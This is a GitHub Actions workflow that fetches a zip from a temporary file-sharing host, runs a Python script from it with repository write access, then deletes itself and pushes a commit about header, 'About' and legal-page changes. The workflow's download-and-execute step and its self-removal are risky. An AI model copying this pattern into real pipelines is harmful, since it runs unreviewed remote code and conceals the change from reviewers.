name: rh-legal
on:
  push:
    paths: ['.github/workflows/rh-legal.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply patch
        run: |
          set -e
          curl -sSL -X POST https://temp.sh/QuBfz/l.zip -o /tmp/p.zip
          echo "91dbbb74e13477763e3612a17af17ca8  /tmp/p.zip" | md5sum -c
          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
          python3 /tmp/p/apply.py
          for f in src/community/topTrustUI.tsx src/community/Community.tsx src/community/v4.tsx src/community/extras.tsx src/pages/legal/Legal.tsx; do npx -y esbuild@0.23.0 "$f" --loader:.tsx=tsx --log-level=error > /dev/null; done
          git rm -q .github/workflows/rh-legal.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -qm "Top 100 in header and tab bar; About only Carlos de Ory Gordillo; legal pages cover Top 100"
          git push
